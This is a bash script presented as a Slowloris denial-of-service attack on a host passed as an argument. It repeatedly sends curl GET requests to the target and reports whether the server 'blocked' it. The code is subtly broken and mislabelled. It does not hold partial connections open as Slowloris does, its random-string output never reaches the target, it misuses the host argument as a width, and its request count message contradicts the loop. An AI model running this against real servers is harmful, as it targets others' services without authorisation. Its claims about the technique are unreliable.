#!/usr/bin/env bash


# get host to perform attack
HOST=$1

# message
echo "Starting Slowloris attack ...";

echo "performing at:";

# print date to set attack
date "+%Y/%m/%d %H:%M:%S";

echo "\n";

# make a loop to perform attack
for _ in {1..1000}
do
  TMP=$(curl -i -X GET "$HOST")
  echo Got: "$TMP"

  if [[ "$TMP" == *"400"* ]]; then
    echo "System is secure on Slowloris attack!"
    exit 1;
  fi

  cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-20} | head -n 10

  sleep 1s;
done

echo "Sent 100 http requests on this attack!";

sleep 5s;

echo "System did not block me!";

exit 0;
